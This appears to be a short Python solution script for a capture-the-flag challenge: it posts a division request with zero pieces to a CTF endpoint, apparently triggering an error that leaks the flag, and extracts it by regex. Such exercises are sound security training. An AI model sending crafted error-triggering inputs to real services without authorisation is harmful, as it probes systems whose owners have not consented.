import requests
import re

URL = "http://dividifacile.challs.olicyber.it/divide"

data = {
  "amount": "2",
  "pieces": "0"
}

r = requests.post(URL, json=data)
flag = re.search(r'ITASEC{.*}', r.text).group(0)
print(flag.replace("\"}", ""))


